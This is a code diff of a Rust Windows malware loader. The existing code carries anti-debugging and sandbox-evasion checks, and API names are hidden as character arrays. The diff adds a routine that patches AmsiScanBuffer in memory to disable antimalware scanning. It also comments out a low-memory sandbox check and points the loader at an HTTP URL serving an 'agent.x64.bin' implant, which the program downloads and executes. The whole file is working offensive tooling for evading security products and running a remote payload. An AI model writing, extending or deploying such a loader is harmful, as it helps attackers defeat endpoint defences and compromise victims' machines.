@@ -12,16 +12,27 @@ use std::time::SystemTime;
 use std::vec::Vec;
 use winapi::shared::basetsd::SIZE_T;
 use winapi::shared::basetsd::ULONG_PTR;
-use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPCVOID, LPVOID};
-use winapi::shared::ntdef::HANDLE;
+use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPVOID};
 use winapi::um::libloaderapi::*;
-use winapi::um::minwinbase::*;
 use winapi::um::processthreadsapi::*;
 use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
-use winapi::um::winbase::CREATE_SUSPENDED;
 use winapi::um::winnt::*;
 use windows_sys::Win32::Foundation::WAIT_FAILED;
 use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
+use std::{ptr};
+
+use winapi::um::{
+        memoryapi::{
+            VirtualProtect,
+            WriteProcessMemory
+        },
+        libloaderapi::{
+            LoadLibraryA,
+            GetProcAddress
+        },
+        processthreadsapi::GetCurrentProcess,
+        winnt::PAGE_READWRITE
+    };
 
 unsafe fn allocate_and_randomize(size: SIZE_T) -> LPVOID {
     let mut buffer: Vec<u8> = vec![0; size as usize];
@@ -44,6 +55,27 @@ unsafe fn enhanced_anti_debugging() {
     } else {
         sleep(Duration::from_millis(10));
     }
+}
+unsafe fn asds(){
+    // Getting the address of AmsiScanBuffer.
+    let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
+    let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
+    let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+    let mut old_permissions: DWORD = 0;
+
+    // Overwrite this address with nops.
+    if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
+        panic!("[-] Failed to change protection.");
+    }
+    let written: *mut usize = ptr::null_mut();
+
+    if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
+        panic!("[-] Failed to overwrite function.");
+    }
+
+    // Restoring the permissions.
+    VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
+    println!("[+] AmsiScanBuffer patched!");
 }
 
 fn load_function(module: &str, proc_name: &str) -> *const () {
@@ -117,12 +149,14 @@ fn evade() {
         GlobalMemoryStatusEx(&mut statex);
     }
 
-    let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
-    if total_memory_in_gb <= 1 {
-        exit(1);
+    // let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
+    // if total_memory_in_gb <= 1 {
+    //     exit(1);
+    // }
+    unsafe {
+        asds();
     }
 }
-
 fn main() {
     evade();
     let virtual_alloc: [char; 12] = ['V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'];
@@ -138,10 +172,11 @@ fn main() {
     let pw_virtual_protect: VirtualProtectFunc =
         unsafe { std::mem::transmute(load_function("kernel32.dll", &virtual_protect_str)) };
 
-    let url = "tcp://192.168.15.104:81";
+    let url = "http://10.200.47.3:8443/agent.x64.bin";
     let payload = match get_payload_from_url(url) {
         Ok(data) => data,
         Err(_e) => {
+            println!("Error getting payload from url {}", _e);
             exit(1);
         }
     };
